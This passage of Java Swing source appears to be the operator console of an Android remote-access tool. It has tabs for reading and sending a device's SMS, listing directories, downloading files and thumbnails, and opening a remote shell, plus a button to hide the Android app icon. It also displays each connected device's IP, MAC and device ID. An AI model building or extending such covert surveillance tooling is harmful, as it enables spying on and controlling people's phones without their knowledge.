                        .addGap(35, 35, 35)
                        .addGroup(jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                            .addComponent(btnGetSMS, javax.swing.GroupLayout.DEFAULT_SIZE, 164, Short.MAX_VALUE)
                            .addComponent(selectSMS, 0, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)))
                    .addGroup(jPanel2Layout.createSequentialGroup()
                        .addGap(88, 88, 88)
                        .addComponent(jLabel16)))
                .addContainerGap(26, Short.MAX_VALUE))
        );
        jPanel2Layout.setVerticalGroup(
            jPanel2Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel2Layout.createSequentialGroup()
                .addGap(11, 11, 11)
                .addComponent(jLabel16)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(selectSMS, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, 29, Short.MAX_VALUE)
                .addComponent(btnGetSMS)
                .addGap(16, 16, 16))
        );

        jPanel9.setBorder(javax.swing.BorderFactory.createEtchedBorder());

        jLabel14.setFont(new java.awt.Font("Tahoma", 1, 14)); // NOI18N
        jLabel14.setText("Number");

        jButton2.setFont(new java.awt.Font("Consolas", 1, 14)); // NOI18N
        jButton2.setText("SEND");
        jButton2.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton2ActionPerformed(evt);
            }
        });

        jLabel15.setFont(new java.awt.Font("Tahoma", 1, 14)); // NOI18N
        jLabel15.setText("Message");

        jLabel1.setForeground(new java.awt.Color(102, 255, 0));
        jLabel1.setText("SEND SMS");

        javax.swing.GroupLayout jPanel9Layout = new javax.swing.GroupLayout(jPanel9);
        jPanel9.setLayout(jPanel9Layout);
        jPanel9Layout.setHorizontalGroup(
            jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel9Layout.createSequentialGroup()
                .addGroup(jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel9Layout.createSequentialGroup()
                        .addContainerGap()
                        .addGroup(jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                            .addGroup(jPanel9Layout.createSequentialGroup()
                                .addComponent(jLabel15, javax.swing.GroupLayout.PREFERRED_SIZE, 68, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .addComponent(textSmsMsg, javax.swing.GroupLayout.PREFERRED_SIZE, 344, javax.swing.GroupLayout.PREFERRED_SIZE))
                            .addGroup(javax.swing.GroupLayout.Alignment.LEADING, jPanel9Layout.createSequentialGroup()
                                .addComponent(jLabel14, javax.swing.GroupLayout.PREFERRED_SIZE, 71, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                .addComponent(textSmsNumber, javax.swing.GroupLayout.PREFERRED_SIZE, 344, javax.swing.GroupLayout.PREFERRED_SIZE))))
                    .addGroup(jPanel9Layout.createSequentialGroup()
                        .addGap(174, 174, 174)
                        .addComponent(jLabel1))
                    .addGroup(jPanel9Layout.createSequentialGroup()
                        .addGap(124, 124, 124)
                        .addComponent(jButton2, javax.swing.GroupLayout.PREFERRED_SIZE, 257, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(31, Short.MAX_VALUE))
        );
        jPanel9Layout.setVerticalGroup(
            jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel9Layout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(jLabel1)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel14, javax.swing.GroupLayout.Alignment.TRAILING)
                    .addComponent(textSmsNumber, javax.swing.GroupLayout.Alignment.TRAILING, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(18, 18, 18)
                .addGroup(jPanel9Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jLabel15)
                    .addComponent(textSmsMsg, javax.swing.GroupLayout.PREFERRED_SIZE, 67, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton2)
                .addGap(46, 46, 46))
        );

        javax.swing.GroupLayout jPanel8Layout = new javax.swing.GroupLayout(jPanel8);
        jPanel8.setLayout(jPanel8Layout);
        jPanel8Layout.setHorizontalGroup(
            jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel8Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jPanel9, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(40, 40, 40)
                .addComponent(jPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(49, Short.MAX_VALUE))
        );
        jPanel8Layout.setVerticalGroup(
            jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel8Layout.createSequentialGroup()
                .addGap(34, 34, 34)
                .addGroup(jPanel8Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addComponent(jPanel9, javax.swing.GroupLayout.PREFERRED_SIZE, 171, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(jPanel2, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jTabbedPane2.addTab("SMS", jPanel8);

        jTabbedPane3.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));

        btnGetDirs.setText("Get directories");
        btnGetDirs.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnGetDirsActionPerformed(evt);
            }
        });

        txtDirsSavedIn.setEditable(false);
        txtDirsSavedIn.setText("dirs saved in....");
        txtDirsSavedIn.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                txtDirsSavedInActionPerformed(evt);
            }
        });

        labelDirsCaptured.setFont(new java.awt.Font("Segoe UI", 0, 16)); // NOI18N
        labelDirsCaptured.setForeground(new java.awt.Color(204, 0, 0));
        labelDirsCaptured.setText("Directories not captured yet ");

        javax.swing.GroupLayout jPanel10Layout = new javax.swing.GroupLayout(jPanel10);
        jPanel10.setLayout(jPanel10Layout);
        jPanel10Layout.setHorizontalGroup(
            jPanel10Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel10Layout.createSequentialGroup()
                .addGroup(jPanel10Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel10Layout.createSequentialGroup()
                        .addGap(215, 215, 215)
                        .addComponent(btnGetDirs, javax.swing.GroupLayout.PREFERRED_SIZE, 266, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(jPanel10Layout.createSequentialGroup()
                        .addGap(21, 21, 21)
                        .addGroup(jPanel10Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(labelDirsCaptured, javax.swing.GroupLayout.PREFERRED_SIZE, 251, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addComponent(txtDirsSavedIn, javax.swing.GroupLayout.PREFERRED_SIZE, 746, javax.swing.GroupLayout.PREFERRED_SIZE))))
                .addContainerGap(16, Short.MAX_VALUE))
        );
        jPanel10Layout.setVerticalGroup(
            jPanel10Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel10Layout.createSequentialGroup()
                .addContainerGap(27, Short.MAX_VALUE)
                .addComponent(btnGetDirs)
                .addGap(18, 18, 18)
                .addComponent(labelDirsCaptured)
                .addGap(18, 18, 18)
                .addComponent(txtDirsSavedIn, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(48, 48, 48))
        );

        jTabbedPane3.addTab("Directories", jPanel10);

        btnDownloadFile.setText("Download");
        btnDownloadFile.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnDownloadFileActionPerformed(evt);
            }
        });

        textDownloadFile.setText("Enter  file absolute path or folder path to download all files");

        jLabel17.setText("Get image thumbnails");

        txtDownloadThumb.setText("Enter  file absolute path or folder path to make thumb of all folder files");

        btnDownloadThumb.setText("Download");
        btnDownloadThumb.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnDownloadThumbActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel11Layout = new javax.swing.GroupLayout(jPanel11);
        jPanel11.setLayout(jPanel11Layout);
        jPanel11Layout.setHorizontalGroup(
            jPanel11Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel11Layout.createSequentialGroup()
                .addGap(23, 23, 23)
                .addGroup(jPanel11Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel11Layout.createSequentialGroup()
                        .addComponent(textDownloadFile, javax.swing.GroupLayout.PREFERRED_SIZE, 444, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(btnDownloadFile, javax.swing.GroupLayout.PREFERRED_SIZE, 114, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addComponent(jLabel17, javax.swing.GroupLayout.PREFERRED_SIZE, 202, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addGroup(jPanel11Layout.createSequentialGroup()
                        .addComponent(txtDownloadThumb, javax.swing.GroupLayout.PREFERRED_SIZE, 419, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                        .addComponent(btnDownloadThumb)))
                .addContainerGap(193, Short.MAX_VALUE))
        );
        jPanel11Layout.setVerticalGroup(
            jPanel11Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel11Layout.createSequentialGroup()
                .addGap(27, 27, 27)
                .addGroup(jPanel11Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(textDownloadFile, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnDownloadFile))
                .addGap(18, 18, 18)
                .addComponent(jLabel17)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addGroup(jPanel11Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(txtDownloadThumb, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnDownloadThumb))
                .addContainerGap(66, Short.MAX_VALUE))
        );

        jTabbedPane3.addTab("Download", jPanel11);

        javax.swing.tree.DefaultMutableTreeNode treeNode1 = new javax.swing.tree.DefaultMutableTreeNode("JTree");
        javax.swing.tree.DefaultMutableTreeNode treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("test1");
        javax.swing.tree.DefaultMutableTreeNode treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("ravioli2");
        javax.swing.tree.DefaultMutableTreeNode treeNode4 = new javax.swing.tree.DefaultMutableTreeNode("blano");
        treeNode3.add(treeNode4);
        treeNode4 = new javax.swing.tree.DefaultMutableTreeNode("mixto");
        javax.swing.tree.DefaultMutableTreeNode treeNode5 = new javax.swing.tree.DefaultMutableTreeNode("con picante");
        treeNode4.add(treeNode5);
        treeNode5 = new javax.swing.tree.DefaultMutableTreeNode("sin pic");
        treeNode4.add(treeNode5);
        treeNode3.add(treeNode4);
        treeNode2.add(treeNode3);
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("colors");
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("blue");
        treeNode2.add(treeNode3);
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("violet");
        treeNode2.add(treeNode3);
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("red");
        treeNode2.add(treeNode3);
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("yellow");
        treeNode2.add(treeNode3);
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("sports");
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("basketball");
        treeNode2.add(treeNode3);
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("soccer");
        treeNode2.add(treeNode3);
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("football");
        treeNode2.add(treeNode3);
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("hockey");
        treeNode2.add(treeNode3);
        treeNode1.add(treeNode2);
        treeNode2 = new javax.swing.tree.DefaultMutableTreeNode("food");
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("hot dogs");
        treeNode2.add(treeNode3);
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("pizza");
        treeNode2.add(treeNode3);
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("ravioli");
        treeNode2.add(treeNode3);
        treeNode3 = new javax.swing.tree.DefaultMutableTreeNode("bananas");
        treeNode2.add(treeNode3);
        treeNode1.add(treeNode2);
        jTree2.setModel(new javax.swing.tree.DefaultTreeModel(treeNode1));
        jScrollPane6.setViewportView(jTree2);

        jButton5.setText("Download Selected");
        jButton5.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton5ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel12Layout = new javax.swing.GroupLayout(jPanel12);
        jPanel12.setLayout(jPanel12Layout);
        jPanel12Layout.setHorizontalGroup(
            jPanel12Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel12Layout.createSequentialGroup()
                .addContainerGap()
                .addComponent(jScrollPane6, javax.swing.GroupLayout.PREFERRED_SIZE, 300, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(51, 51, 51)
                .addComponent(jButton5)
                .addContainerGap(295, Short.MAX_VALUE))
        );
        jPanel12Layout.setVerticalGroup(
            jPanel12Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(javax.swing.GroupLayout.Alignment.TRAILING, jPanel12Layout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addComponent(jScrollPane6, javax.swing.GroupLayout.PREFERRED_SIZE, 166, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addGap(202, 202, 202))
            .addGroup(jPanel12Layout.createSequentialGroup()
                .addGap(30, 30, 30)
                .addComponent(jButton5)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );

        jTabbedPane3.addTab("Dirs Test", jPanel12);

        jTabbedPane2.addTab("Files", jTabbedPane3);

        jPanel5.setBorder(javax.swing.BorderFactory.createLineBorder(new java.awt.Color(0, 0, 0)));

        inputTextShell.setText("Write command here ...");
        inputTextShell.addFocusListener(new java.awt.event.FocusAdapter() {
            public void focusGained(java.awt.event.FocusEvent evt) {
                inputTextShellFocusGained(evt);
            }
            public void focusLost(java.awt.event.FocusEvent evt) {
                inputTextShellFocusLost(evt);
            }
        });

        btnGetShellExecute.setText("Execute");
        btnGetShellExecute.setPreferredSize(new java.awt.Dimension(77, 29));
        btnGetShellExecute.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnGetShellExecuteActionPerformed(evt);
            }
        });

        btnGetShell.setBackground(new java.awt.Color(0, 255, 51));
        btnGetShell.setText("Get Shell");
        btnGetShell.setPreferredSize(new java.awt.Dimension(83, 35));
        btnGetShell.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnGetShellActionPerformed(evt);
            }
        });

        btnExitShell.setBackground(new java.awt.Color(240, 39, 39));
        btnExitShell.setText("Exit Shell");
        btnExitShell.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                btnExitShellActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout jPanel5Layout = new javax.swing.GroupLayout(jPanel5);
        jPanel5.setLayout(jPanel5Layout);
        jPanel5Layout.setHorizontalGroup(
            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel5Layout.createSequentialGroup()
                .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(jPanel5Layout.createSequentialGroup()
                        .addContainerGap()
                        .addComponent(inputTextShell, javax.swing.GroupLayout.PREFERRED_SIZE, 536, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                        .addComponent(btnGetShellExecute, javax.swing.GroupLayout.PREFERRED_SIZE, 77, javax.swing.GroupLayout.PREFERRED_SIZE))
                    .addGroup(jPanel5Layout.createSequentialGroup()
                        .addGap(19, 19, 19)
                        .addComponent(btnGetShell, javax.swing.GroupLayout.PREFERRED_SIZE, 116, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(50, 50, 50)
                        .addComponent(btnExitShell, javax.swing.GroupLayout.PREFERRED_SIZE, 118, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap(152, Short.MAX_VALUE))
        );
        jPanel5Layout.setVerticalGroup(
            jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(jPanel5Layout.createSequentialGroup()
                .addGap(45, 45, 45)
                .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(btnExitShell, javax.swing.GroupLayout.PREFERRED_SIZE, 44, javax.swing.GroupLayout.PREFERRED_SIZE)
                    .addComponent(btnGetShell, javax.swing.GroupLayout.PREFERRED_SIZE, 44, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(60, 60, 60)
                .addGroup(jPanel5Layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                    .addComponent(inputTextShell)
                    .addComponent(btnGetShellExecute, javax.swing.GroupLayout.PREFERRED_SIZE, 22, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addGap(32, 32, 32))
        );

        jTabbedPane2.addTab("Shell", jPanel5);

        textAreaDebugInfo.setEditable(false);
        textAreaDebugInfo.setBackground(new java.awt.Color(0, 0, 0));
        textAreaDebugInfo.setColumns(20);
        textAreaDebugInfo.setFont(new java.awt.Font("Consolas", 0, 14)); // NOI18N
        textAreaDebugInfo.setForeground(new java.awt.Color(0, 255, 0));
        textAreaDebugInfo.setLineWrap(true);
        textAreaDebugInfo.setRows(5);
        textAreaDebugInfo.addCaretListener(new javax.swing.event.CaretListener() {
            public void caretUpdate(javax.swing.event.CaretEvent evt) {
                textAreaDebugInfoCaretUpdate(evt);
            }
        });
        jScrollPane1.setViewportView(textAreaDebugInfo);

        jButton4.setBackground(new java.awt.Color(0, 153, 255));
        jButton4.setFont(new java.awt.Font("Segoe UI", 1, 14)); // NOI18N
        jButton4.setText("Clear");
        jButton4.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton4ActionPerformed(evt);
            }
        });

        jButton7.setText("Hide android app icon");
        jButton7.addActionListener(new java.awt.event.ActionListener() {
            public void actionPerformed(java.awt.event.ActionEvent evt) {
                jButton7ActionPerformed(evt);
            }
        });

        javax.swing.GroupLayout layout = new javax.swing.GroupLayout(getContentPane());
        getContentPane().setLayout(layout);
        layout.setHorizontalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                    .addGroup(layout.createSequentialGroup()
                        .addContainerGap()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addGroup(layout.createSequentialGroup()
                                .addGap(10, 10, 10)
                                .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGap(85, 85, 85)
                                .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addGroup(layout.createSequentialGroup()
                                        .addGap(18, 18, 18)
                                        .addComponent(jLabel4)
                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                                        .addComponent(textPort, javax.swing.GroupLayout.PREFERRED_SIZE, 99, javax.swing.GroupLayout.PREFERRED_SIZE)
                                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                        .addComponent(btnStart, javax.swing.GroupLayout.PREFERRED_SIZE, 123, javax.swing.GroupLayout.PREFERRED_SIZE))
                                    .addGroup(layout.createSequentialGroup()
                                        .addGap(8, 8, 8)
                                        .addComponent(jButton7))))
                            .addGroup(layout.createSequentialGroup()
                                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                                    .addComponent(jLabel2)
                                    .addComponent(jScrollPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 199, javax.swing.GroupLayout.PREFERRED_SIZE))
                                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)
                                .addComponent(jTabbedPane2))))
                    .addGroup(layout.createSequentialGroup()
                        .addGap(22, 22, 22)
                        .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 966, javax.swing.GroupLayout.PREFERRED_SIZE)))
                .addContainerGap())
            .addGroup(layout.createSequentialGroup()
                .addGap(112, 112, 112)
                .addComponent(jButton4, javax.swing.GroupLayout.PREFERRED_SIZE, 756, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
        );
        layout.setVerticalGroup(
            layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
            .addGroup(layout.createSequentialGroup()
                .addContainerGap(javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING)
                            .addComponent(jPanel1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)
                            .addGroup(layout.createSequentialGroup()
                                .addGap(8, 8, 8)
                                .addComponent(jTextField1, javax.swing.GroupLayout.PREFERRED_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.PREFERRED_SIZE)))
                        .addGap(21, 21, 21))
                    .addGroup(layout.createSequentialGroup()
                        .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.TRAILING, false)
                            .addComponent(btnStart, javax.swing.GroupLayout.Alignment.LEADING, javax.swing.GroupLayout.DEFAULT_SIZE, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                            .addGroup(javax.swing.GroupLayout.Alignment.LEADING, layout.createParallelGroup(javax.swing.GroupLayout.Alignment.BASELINE)
                                .addComponent(textPort, javax.swing.GroupLayout.PREFERRED_SIZE, 33, javax.swing.GroupLayout.PREFERRED_SIZE)
                                .addComponent(jLabel4)))
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED, javax.swing.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .addComponent(jButton7)
                        .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.UNRELATED)))
                .addGroup(layout.createParallelGroup(javax.swing.GroupLayout.Alignment.LEADING, false)
                    .addGroup(layout.createSequentialGroup()
                        .addComponent(jLabel2, javax.swing.GroupLayout.PREFERRED_SIZE, 18, javax.swing.GroupLayout.PREFERRED_SIZE)
                        .addGap(3, 3, 3)
                        .addComponent(jScrollPane2))
                    .addComponent(jTabbedPane2, javax.swing.GroupLayout.PREFERRED_SIZE, 245, javax.swing.GroupLayout.PREFERRED_SIZE))
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jScrollPane1, javax.swing.GroupLayout.PREFERRED_SIZE, 267, javax.swing.GroupLayout.PREFERRED_SIZE)
                .addPreferredGap(javax.swing.LayoutStyle.ComponentPlacement.RELATED)
                .addComponent(jButton4)
                .addGap(12, 12, 12))
        );

        pack();
    }// </editor-fold>//GEN-END:initComponents

    private void textAreaDebugInfoCaretUpdate(javax.swing.event.CaretEvent evt) {//GEN-FIRST:event_textAreaDebugInfoCaretUpdate
 
    }//GEN-LAST:event_textAreaDebugInfoCaretUpdate

    private void jButton4ActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jButton4ActionPerformed
        textAreaDebugInfo.setText("");
    }//GEN-LAST:event_jButton4ActionPerformed
    private String convertFileNameToThumbName(String file)
    {
        String[] parts = file.split("/");
        String thumbPath = parts[parts.length-1];
        parts[parts.length-1] =  "thumb_" + parts[parts.length-1];
        thumbPath = String.join("/",parts);
        return thumbPath;
    }
    private void connectedListValueChanged(javax.swing.event.ListSelectionEvent evt) {//GEN-FIRST:event_connectedListValueChanged
        
      selected = getSelected();//sarasa
      labelUsInfo1.setFont(new Font("Consolas", Font.PLAIN, 16));
        
      String v = connectedList.getSelectedValue();
      if( v!=null ){ // IF LIST ITEM IS SELECTED
               // CHECK IF USER HAVE SAVED INFO (APPS, DIRS, ETC.) AND FILL DATA IN FRONTEND
            ClientInfo cli = getSelectedClient("");
            if( cli.downloadPath != null && !cli.downloadPath.equals("") ){
               labelDirsCaptured_public.setText("Directories & Files Saved in: ");labelDirsCaptured_public.setForeground(Color.GREEN);
               txtDirsSavedIn_publ.setText(cli.downloadPath);
            }
            if( !cli.installedAppsSystem.isEmpty() ){
               DefaultListModel mSys = new DefaultListModel();
               for (String app : cli.installedAppsSystem) mSys.addElement(app);
               formServer5.listSystemApps2.setModel(mSys);
            }else{
               DefaultListModel listmodel=new DefaultListModel();
               listSystemApps2.setModel(listmodel); listSystemApps2.removeAll();
            }
            if(!cli.installedAppsUser.isEmpty()){
               DefaultListModel mUser = new DefaultListModel();
               for (String app : cli.installedAppsUser) mUser.addElement(app);
               formServer5.listUserApps2.setModel(mUser);
            }else{
                DefaultListModel listmodel=new DefaultListModel();
               listUserApps2.setModel(listmodel); listUserApps2.removeAll();
            }
      }
      for (EchoThread c : clients) {
            if(c.getID() != null && c.getID().equals(v)){
                Socket ts = c.getSocket();
                if(!ts.isClosed()){ 
                      // IF SELECTED ITEM IS CONNECTED ENABLE BUTTONS, ETC.
                    Boolean shellOn = c.shellIsOn();
                    if(!shellOn){
                        setShellDisabled(); //btnExitShell.setEnabled(false);
                    }else{
                        setShellEnabled();
                        btnGetShellExecute.setEnabled(true);
                        //btnExitShell.setEnabled(true);btnGetShellExecute.setEnabled(true);
                    }
                    btnGetDirs.setEnabled(true); btnGetSMS.setEnabled(true); //btnDeleteUser.setEnabled(true);
                    Color color; color = new Color(0, 179, 30);
                    labelUsInfo1.setForeground(color);labelUsInfo1.setText("Online");
                }else{
                      // IF SELECTED ITEM ISN'T CONNECTED DISABLE BUTTONS, ETC.
                    btnGetShell.setEnabled(false);btnGetShellExecute.setEnabled(false);
                    btnGetDirs.setEnabled(false); btnGetSMS.setEnabled(false);
                    //btnDeleteUser.setEnabled(false);
                    labelUsInfo1.setText("Not connected");
                    Color color; color = new Color(255, 0, 0);
                    labelUsInfo1.setForeground(color);
                }
                // FILL INFO IN FRONTEND  (USER INFO)
                String[] usinfo = c.getUsInfo();
                String ip = usinfo[7];
                String mac = usinfo[1];
                String brand = usinfo[2];
                String manufacturer = usinfo[3];
                String model = usinfo[4];
                String version = usinfo[5];
                String sdk = usinfo[6];
                String deviceID = usinfo[8];
                labelUsInfo_1.setText(ip); 
                labelUsInfo_3.setText(brand + " / " + manufacturer + "  " +model);
                labelUsInfo_4.setText(deviceID);
                labelUsInfo_5.setText(version);
